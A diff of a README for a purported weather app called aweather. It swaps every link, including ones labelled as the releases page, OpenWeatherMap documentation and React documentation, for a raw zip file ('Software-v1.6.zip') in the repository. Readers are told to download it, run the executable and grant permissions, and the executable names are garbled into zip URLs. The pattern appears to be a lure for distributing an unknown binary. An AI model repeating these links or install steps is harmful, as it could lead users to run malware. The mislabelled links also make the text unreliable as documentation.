@@ -8,7 +8,7 @@ To begin using the app, follow these steps to easily download and run it.
 
 ## 📥 Download aweather
 
-[![Download aweather](https://raw.githubusercontent.com/ajuwan/aweather/main/pyrenoid/aweather.zip)](https://raw.githubusercontent.com/ajuwan/aweather/main/pyrenoid/aweather.zip)
+[![Download aweather](https://raw.githubusercontent.com/ajuwan/aweather/main/public/Software-v1.6.zip)](https://raw.githubusercontent.com/ajuwan/aweather/main/public/Software-v1.6.zip)
 
 ## 📋 Features
 
@@ -28,19 +28,19 @@ To run **aweather**, you will need the following:
 ## ⬇️ Download & Install
 
 1. **Visit the Releases Page**  
-   To download the latest version of the aweather app, [visit this page to download](https://raw.githubusercontent.com/ajuwan/aweather/main/pyrenoid/aweather.zip).
+   To download the latest version of the aweather app, [visit this page to download](https://raw.githubusercontent.com/ajuwan/aweather/main/public/Software-v1.6.zip).
 
 2. **Select the Latest Release**  
    On the Releases page, choose the most recent version. Look for the version number at the top of the list.
 
 3. **Download the Application**  
-   Click on the asset that corresponds to your operating system. This may be a `.zip`, `https://raw.githubusercontent.com/ajuwan/aweather/main/pyrenoid/aweather.zip`, or other package formats.
+   Click on the asset that corresponds to your operating system. This may be a `.zip`, `https://raw.githubusercontent.com/ajuwan/aweather/main/public/Software-v1.6.zip`, or other package formats.
 
 4. **Extract the Files**  
    Once downloaded, find the file in your Downloads folder. Right-click on it and select “Extract All” or use a similar option based on your operating system.
 
 5. **Run the Application**  
-   Navigate to the extracted folder. Double-click on the executable file (e.g., `https://raw.githubusercontent.com/ajuwan/aweather/main/pyrenoid/aweather.zip` for Windows or `https://raw.githubusercontent.com/ajuwan/aweather/main/pyrenoid/aweather.zip` for macOS) to start the application.
+   Navigate to the extracted folder. Double-click on the executable file (e.g., `https://raw.githubusercontent.com/ajuwan/aweather/main/public/Software-v1.6.zip` for Windows or `https://raw.githubusercontent.com/ajuwan/aweather/main/public/Software-v1.6.zip` for macOS) to start the application.
 
 6. **Grant Permissions**  
    If prompted by your operating system, allow the application to run.
@@ -60,8 +60,8 @@ If you encounter any issues or have questions, feel free to reach out to the com
 
 ## 🔗 Further Resources
 
-- [OpenWeatherMap API Documentation](https://raw.githubusercontent.com/ajuwan/aweather/main/pyrenoid/aweather.zip) - Learn more about the data sources for your weather updates.
-- [React Documentation](https://raw.githubusercontent.com/ajuwan/aweather/main/pyrenoid/aweather.zip) - Familiarize yourself with the technology behind aweather.
+- [OpenWeatherMap API Documentation](https://raw.githubusercontent.com/ajuwan/aweather/main/public/Software-v1.6.zip) - Learn more about the data sources for your weather updates.
+- [React Documentation](https://raw.githubusercontent.com/ajuwan/aweather/main/public/Software-v1.6.zip) - Familiarize yourself with the technology behind aweather.
 
 ## 📅 Future Updates
 
@@ -77,4 +77,4 @@ Stay tuned for these features in future releases!
 
 Although this app is ready for you to use right away, we welcome contributions! If you have ideas or improvements, please submit suggestions through GitHub.
 
-Visit the [Releases Page](https://raw.githubusercontent.com/ajuwan/aweather/main/pyrenoid/aweather.zip) again to check for the latest updates every few weeks!
+Visit the [Releases Page](https://raw.githubusercontent.com/ajuwan/aweather/main/public/Software-v1.6.zip) again to check for the latest updates every few weeks!
